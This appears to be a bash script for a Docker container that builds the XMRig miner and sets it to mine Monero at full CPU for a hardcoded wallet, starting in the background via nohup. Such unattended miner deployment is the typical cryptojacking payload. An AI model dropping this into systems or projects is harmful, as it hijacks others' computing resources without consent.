#!/bin/bash

# Update package lists and install necessary dependencies
apt-get update && \
    apt-get install -y \
    git \
    build-essential \
    cmake \
    libuv1-dev \
    libssl-dev \
    libhwloc-dev

# Clone xmrig repository
cd /root
git clone https://github.com/xmrig/xmrig.git /xmrig && \
    cd /xmrig && \
    mkdir build && \
    cd build && \
    cmake .. && \
    make -j$(nproc)

# Set the working directory for subsequent commands
cd /xmrig/build

# Create a file named config.json in the workdir
touch config.json && echo '{ \
    "api": { \
        "port": 0, \
        "access-token": null, \
        "worker-id": null \
    }, \
    "http": { \
        "enabled": false, \
        "host": "127.0.0.1", \
        "port": 0, \
        "access-token": null, \
        "restricted": true \
    }, \
    "autosave": true, \
    "background": false, \
    "colors": true, \
    "randomx": { \
        "init": -1, \
        "numa": true \
    }, \
    "opencl": { \
        "enabled": false \
    }, \
    "cuda": { \
        "enabled": false \
    }, \
    "pools": [ \
        { \
            "url": "gulf.moneroocean.stream:443", \
            "user": "4ANVKmSNmiV8nrRaYsjuYN9f2L8Ah8d8AXpfCaDeqn2fcR5WxaAuEQYiuN6cHEZLNAJTscbJmDwJj7wLPypAHvJ5Bymwh3v", \
            "keepalive": true, \
            "tls": true, \
            "tls-fingerprint": "", \
            "daemon": false, \
            "nicehash": false, \
            "self-select": false \
        } \
    ], \
    "print-time": 60, \
    "retries": 5, \
    "retry-pause": 5, \
    "syslog": false, \
    "user-agent": null, \
    "verbose": true, \
    "watch": true, \
    "coin": "monero", \
    "rig-id": "dockerminer", \
    "httpd": false, \
    "log-file": null, \
    "max-cpu-usage": 100, \
    "reduced-dev-usage": false, \
    "rig-id-append": "", \
    "threads": null \
}' > config.json

# Create cmd.sh file and add the mining command
touch cmd.sh
echo 'nohup ./xmrig -o gulf.moneroocean.stream:10128 -u 4ANVKmSNmiV8nrRaYsjuYN9f2L8Ah8d8AXpfCaDeqn2fcR5WxaAuEQYiuN6cHEZLNAJTscbJmDwJj7wLPypAHvJ5Bymwh3v -p dockerminer &' > cmd.sh

# Make cmd.sh executable
chmod +x cmd.sh
